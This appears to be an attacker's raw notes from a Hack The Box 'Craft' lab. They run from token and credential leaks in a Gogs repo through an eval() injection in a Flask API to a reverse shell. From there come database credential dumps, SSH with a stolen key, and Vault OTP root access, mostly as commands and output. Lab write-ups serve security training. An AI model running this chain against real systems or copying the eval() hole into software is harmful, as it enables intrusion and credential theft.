@@ -1,0 +1,402 @@
+Found a link on port 443
+https://api.craft.htb/api/
+
+add api.craft.htb to hosts file
+
+also gogs.craft.htb
+
+
+
+GOT AUTH TOKEN FROM ISSUES https://gogs.craft.htb/Craft/craft-api/issues/2
+It's possible to add bogus ABV values to the database. For instance, a brew with 15.0 ABV... can we add a check to make sure ABV is sane before writing to the DB?
+curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+
+
+ENUMERATE BREW ID
+root@kali:~/htb/boxes# gobuster dir -k -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u https://api.craft.htb/api/brew/
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            https://api.craft.htb/api/brew/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/07/13 16:25:47 Starting gobuster
+===============================================================
+/46 (Status: 200)
+/79 (Status: 200)
+/81 (Status: 200)
+/2005 (Status: 200)
+/16 (Status: 200)
+/2003 (Status: 200)
+/12 (Status: 200)
+/26 (Status: 200)
+/2004 (Status: 200)
+/17 (Status: 200)
+/13 (Status: 200)
+
+
+Commits history
+https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1
+
+ import requests
+ import json
+-response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
++response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
+ json_response = json.loads(response.text)
+ token =  json_response['token']
+
+GET AUTH TOKEN
+root@kali:~/HTB/Craft# python getoken.py
+<Response [200]>
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMDUyOTQzfQ.TRCNih4SdXpZmG9jA_p6nYYWrvkfS3wT4FwT1Ck4aHw
+{"message":"Token is valid!"}
+
+
+
+USE EVAL TO INJECT INTO CODE FOLLOWING THIS BUG
+https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6
+
+
++
+
+		
+
++        # make sure the ABV value is sane.
+
+		
+
++        if eval('%s > 1' % request.json['abv']):
++            return "ABV must be a decimal value less than 1.0", 400
++        else:
++            create_brew(request.json)
++            return None, 201
+
+
+Run abv.py and get a shell
+
+root@kali:~/HTB/Craft# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.57] from craft.htb [10.10.10.110] 37019
+/bin/sh: can't access tty; job control turned off
+/opt/app # 
+
+/opt/app # whoami
+root
+
+/home # ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:06  
+          inet addr:172.20.0.6  Bcast:172.20.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:549105 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:479547 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:54251018 (51.7 MiB)  TX bytes:69372508 (66.1 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:26 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:26 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:1398 (1.3 KiB)  TX bytes:1398 (1.3 KiB)
+
+/home # 
+Docker
+/home # uname -a
+Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux
+/home # env
+HOSTNAME=5a3d243127f5
+PYTHON_PIP_VERSION=19.0.1
+SHLVL=2
+HOME=/root
+OLDPWD=/opt/app
+GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+PYTHON_VERSION=3.6.8
+PWD=/home
+/home # grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+
+
+SUBNET SCAN
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-07-13 22:22 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.20.0.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00048s latency).
+Not shown: 1286 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+MAC Address: 02:42:96:99:ED:C5 (Unknown)
+
+Nmap scan report for craft_vault_1.craft_default (172.20.0.2)
+Host is up (0.00020s latency).
+All 1289 scanned ports on craft_vault_1.craft_default (172.20.0.2) are closed
+MAC Address: 02:42:AC:14:00:02 (Unknown)
+
+Nmap scan report for craft_home_1.craft_default (172.20.0.3)
+Host is up (0.00015s latency).
+All 1289 scanned ports on craft_home_1.craft_default (172.20.0.3) are closed
+MAC Address: 02:42:AC:14:00:03 (Unknown)
+
+Nmap scan report for craft_db_1.craft_default (172.20.0.4)
+Host is up (0.00015s latency).
+Not shown: 1288 closed ports
+PORT     STATE SERVICE
+3306/tcp open  mysql
+MAC Address: 02:42:AC:14:00:04 (Unknown)
+
+
+Nmap scan report for craft_repo_1.craft_default (172.20.0.5)
+Host is up (0.00014s latency).
+Not shown: 1288 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 02:42:AC:14:00:05 (Unknown)
+
+Nmap scan report for craft_proxy_1.craft_default (172.20.0.7)
+Host is up (0.000090s latency).
+Not shown: 1288 closed ports
+PORT    STATE SERVICE
+443/tcp open  https
+MAC Address: 02:42:AC:14:00:07 (Unknown)
+
+Nmap scan report for 5a3d243127f5 (172.20.0.6)
+Host is up (0.000026s latency).
+Not shown: 1288 closed ports
+PORT     STATE SERVICE
+4444/tcp open  krb524
+
+Nmap done: 256 IP addresses (7 hosts up) scanned in 859.74 seconds
+
+
+
+/opt/app/craft_api # cat settings.py
+# Flask settings
+FLASK_SERVER_NAME = 'api.craft.htb'
+FLASK_DEBUG = False  # Do not use debug mode in production
+
+# Flask-Restplus settings
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
+RESTPLUS_VALIDATE = True
+RESTPLUS_MASK_SWAGGER = False
+RESTPLUS_ERROR_404_HELP = False
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+
+# database
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'
+MYSQL_DATABASE_HOST = 'db'
+SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+
+
+/opt/app # python sql2.py
+SQL: show databases
+[{'Database': 'craft'}, {'Database': 'information_schema'}]
+__)
+SQL: use craft
+()
+__)
+SQL: show tables
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+__)
+SQL: SELECT * FROM user
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+__)
+SQL: 
+
+
+
+USING SSH KEYS FROM LOGGING IN AS GILFOYLE ON THE GOGS SERVER
+root@kali:~/HTB/Craft# ssh -i id_rsa gilfoyle@craft.htb
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Enter passphrase for key 'id_rsa': 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jul 13 20:35:50 2019 from 10.10.19.27
+gilfoyle@craft:~$ ls -a
+.  ..  .bashrc	.config  .profile  .ssh  user.txt  .vault-token  .viminfo
+gilfoyle@craft:~$ cat user.txt
+bbf4b0cadfa3d4e6d0914c9cd5a612d4
+gilfoyle@craft:~$ 
+gilfoyle@craft:~$ uname -a
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
+gilfoyle@craft:~$ 
+gilfoyle@craft:~$ env
+SSH_CONNECTION=10.10.16.57 34874 10.10.10.110 22
+LANG=en_US.UTF-8
+XDG_SESSION_ID=30
+USER=gilfoyle
+PWD=/home/gilfoyle
+HOME=/home/gilfoyle
+SSH_CLIENT=10.10.16.57 34874 22
+SSH_TTY=/dev/pts/0
+MAIL=/var/mail/gilfoyle
+TERM=xterm-256color
+SHELL=/bin/bash
+VAULT_ADDR=https://vault.craft.htb:8200/
+SHLVL=1
+LOGNAME=gilfoyle
+XDG_RUNTIME_DIR=/run/user/1001
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+_=/usr/bin/env
+gilfoyle@craft:~$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+
+gilfoyle@craft:~$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	craft craft.htb api.craft.htb gogs.craft.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+172.20.0.2 vault.craft.htb                                                                                                                                   
+
+
+
+PROCESSES RUNNING AS ROOT
+2019/07/13 21:17:01 CMD: UID=0    PID=12230  | /usr/sbin/CRON -f
+2019/07/13 21:17:01 CMD: UID=0    PID=12229  | /usr/sbin/CRON -f
+2019/07/13 21:17:01 CMD: UID=0    PID=12228  | /usr/sbin/CRON -f
+2019/07/13 21:17:01 CMD: UID=0    PID=12233  | /bin/sh -c /opt/admin/manage.sh
+2019/07/13 21:17:01 CMD: UID=0    PID=12234  | docker inspect -f {{.State.Running}} craft_vault_1
+2019/07/13 21:17:01 CMD: UID=0    PID=12243  | docker inspect -f {{.State.Running}} craft_home_1
+2019/07/13 21:17:02 CMD: UID=0    PID=12250  | docker inspect -f {{.State.Running}} craft_db_1
+2019/07/13 21:17:02 CMD: UID=0    PID=12257  | /bin/bash /opt/admin/manage.sh
+2019/07/13 21:17:02 CMD: UID=0    PID=12266  | docker inspect -f {{.State.Running}} craft_api_1
+2019/07/13 21:17:03 CMD: UID=0    PID=12274  | docker inspect -f {{.State.Running}} craft_proxy_1
+2019/07/13 21:17:03 CMD: UID=0    PID=12283  | /bin/bash /opt/admin/manage.sh
+2019/07/13 21:17:03 CMD: UID=0    PID=12292  | /usr/local/bin/vault status
+2019/07/13 21:17:04 CMD: UID=0    PID=12298  | uname -s
+2019/07/13 21:18:01 CMD: UID=0    PID=12330  | /bin/bash /opt/admin/manage.sh
+2019/07/13 21:18:01 CMD: UID=0    PID=12329  | /bin/sh -c /opt/admin/manage.sh
+2019/07/13 21:18:01 CMD: UID=0    PID=12328  | /usr/sbin/CRON -f
+2019/07/13 21:18:01 CMD: UID=0    PID=12331  | docker inspect -f {{.State.Running}} craft_vault_1
+2019/07/13 21:18:01 CMD: UID=0    PID=12339  | docker inspect -f {{.State.Running}} craft_home_1
+2019/07/13 21:18:01 CMD: UID=0    PID=12348  | docker inspect -f {{.State.Running}} craft_db_1
+2019/07/13 21:18:02 CMD: UID=0    PID=12355  | docker inspect -f {{.State.Running}} craft_repo_1
+2019/07/13 21:18:02 CMD: UID=0    PID=12363  | docker inspect -f {{.State.Running}} craft_api_1
+2019/07/13 21:18:02 CMD: UID=0    PID=12371  | docker inspect -f {{.State.Running}} craft_proxy_1
+2019/07/13 21:18:02 CMD: UID=0    PID=12380  | docker inspect -f {{.NetworkSettings.Networks.craft_default.IPAddress}} craft_vault_1
+2019/07/13 21:18:03 CMD: UID=0    PID=12387  | sed -i s/.*vault.craft.htb/172.20.0.2 vault.craft.htb /g /etc/hosts
+2019/07/13 21:18:03 CMD: UID=0    PID=12388  | /usr/local/bin/vault status
+
+
+
+gilfoyle@craft:/usr/local/bin$ ./vault server -dev
+==> Vault server configuration:
+
+             Api Address: http://127.0.0.1:8200
+                     Cgo: disabled
+         Cluster Address: https://127.0.0.1:8201
+              Listener 1: tcp (addr: "127.0.0.1:8200", cluster address: "127.0.0.1:8201", max_request_duration: "1m30s", max_request_size: "33554432", tls: "disabled")
+               Log Level: (not set)
+                   Mlock: supported: true, enabled: false
+                 Storage: inmem
+                 Version: Vault v1.0.2
+             Version Sha: 37a1dc9c477c1c68c022d2084550f25bf20cac33
+
+WARNING! dev mode is enabled! In this mode, Vault runs entirely in-memory
+and starts unsealed with a single unseal key. The root token is already
+authenticated to the CLI, so you can immediately begin using Vault.
+
+You may need to set the following environment variable:
+
+    $ export VAULT_ADDR='http://127.0.0.1:8200'
+
+The unseal key and root token are displayed below in case you want to
+seal/unseal the Vault or re-authenticate.
+
+Unseal Key: K4YImOB8NVevT7mFE4ZzbNlGY+65iTPtGhFP6VQjW0I=
+Root Token: s.YsfYjDOvT3pxGIRN1BKPPPCs
+
+Development mode should NOT be used in production installations!
+
+==> Vault server started! Log data will stream in below:
+
+
+
+./vault ssh -role root_otp -mode otp root@localhost
+
+
+gilfoyle@craft:/usr/local/bin$ ./vault ssh -role root_otp -mode otp root@localhost
+Vault could not locate "sshpass". The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,
+Vault can automatically perform this step for you.
+OTP for the session is: aecdf78a-9205-0a8c-0199-0c4148b3a244
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jul  3 03:38:31 2019
+root@craft:~# ls -a
+.  ..  .bashrc	.cache	.config  .profile  .rnd  root.txt  .selected_editor  .ssh  .vault-token  .vim  .viminfo
+root@craft:~# ls -a
+.  ..  .bashrc	.cache	.config  .profile  .rnd  root.txt  .selected_editor  .ssh  .vault-token  .vim  .viminfo
+root@craft:~# cat root.txt
+831d64ef54d92c1af795daae28a11591
+root@craft:~# 
+
+
+
+
